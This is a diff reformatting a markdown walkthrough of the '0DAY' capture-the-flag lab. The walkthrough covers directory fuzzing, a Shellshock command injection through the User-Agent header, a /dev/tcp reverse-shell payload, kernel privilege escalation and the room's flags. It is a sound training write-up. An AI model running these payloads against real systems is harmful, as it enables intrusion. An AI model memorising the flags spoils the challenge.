@@ -1,27 +1,27 @@
 ---
 sticker: emoji//1f422
 ---
+# ENUMERATION
+---
 
-# 0DAY
 
-## ENUMERATION
 
-***
+## OPEN PORTS
+---
 
-### OPEN PORTS
-
-***
 
 | PORT | SERVICE |
-| ---- | ------- |
+| :--- | :------ |
 | 22   | SSH     |
 | 80   | HTTP    |
 
-## RECONNAISSANCE
 
-***
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250429135028.png)
+# RECONNAISSANCE
+---
+
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250429135028.png)
 
 Let's fuzz:
 
@@ -62,15 +62,17 @@ backup                  [Status: 301, Size: 314, Words: 20, Lines: 10, Duration:
 secret                  [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 159ms]
 ```
 
+
 We got some interesting findings like `backup, secret` and `cgi-bin` let's check the first two:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250429140047.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250429140047.png)
 
 There's an `id_rsa` key on here, we don't have the username so, let's simply save it for now, let's proceed to `secret`:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250429140228.png)
 
-I tried getting some info with `steghide` but no luck, let's proceed then with `cgi-bin`, a `cgi-bin` directory often indicates the presence of legacy CGI (Common Gateway Interface) scripts, which can be vulnerable to attacks like **Shellshock**, **command injection**, or **path traversal** if poorly coded.
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250429140228.png)
+
+I tried getting some info with `steghide` but no luck, let's proceed then with `cgi-bin`, a `cgi-bin` directory often indicates the presence of legacy CGI (Common Gateway Interface) scripts, which can be vulnerable to attacks like **Shellshock**, **command injection**, or **path traversal** if poorly coded. 
 
 Let's try `shellshock`, this vulnerability allows remote code execution without confirmation. A series of random characters, `() { :; }; ,` confuses Bash because it doesn't know what to do with them, so by default, it executes the code after it.
 
@@ -105,9 +107,11 @@ test.cgi                [Status: 200, Size: 13, Words: 2, Lines: 2, Duration: 16
 
 There we go, let's proceed with exploitation.
 
-## EXPLOITATION
 
-***
+
+
+# EXPLOITATION
+---
 
 With this, we can start the `shellshock` attack, let's test it:
 
@@ -115,7 +119,7 @@ With this, we can start the `shellshock` attack, let's test it:
 curl -H "User-Agent: () { :;}; echo; /bin/bash -c 'id'" http://10.10.214.142/cgi-bin/test.cgi
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250429140729.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250429140729.png)
 
 There we go, `shellshock` attack works, let's get a shell then:
 
@@ -123,13 +127,17 @@ There we go, `shellshock` attack works, let's get a shell then:
 curl -H "User-Agent: () { :;}; echo; /bin/bash -c 'sh -i >& /dev/tcp/IP/9001 0>&1'" http://10.10.214.142/cgi-bin/test.cgi
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250429140854.png)
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250429140854.png)
+
 
 We can proceed with privilege escalation.
 
-## PRIVILEGE ESCALATION
 
-***
+
+# PRIVILEGE ESCALATION
+---
+
 
 Let's stabilize our shell first:
 
@@ -143,15 +151,16 @@ export TERM=xterm
 export BASH=bash
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250429141002.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250429141002.png)
 
 Let's use `linpeas` to look for any `PE` vector:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250429142332.png)
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250429142332.png)
 
 As seen, we are dealing with a `3.13.0-32-generic` Linux version, let's search information about how to escalate privileges in it:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250429142418.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250429142418.png)
 
 There's a `c` exploit we can get, once we get it on our victim machine, we can do the following:
 
@@ -178,11 +187,11 @@ Now, let's compile again:
 gcc pe.c -o pe
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250429143345.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250429143345.png)
 
 There we go, we can simply run it now:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250429143408.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250429143408.png)
 
 We are root now and can finally read both flags:
 
@@ -196,4 +205,5 @@ THM{Sh3llSh0ck_r0ckz}
 THM{g00d_j0b_0day_is_Pleased}
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250429143558.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250429143558.png)
+
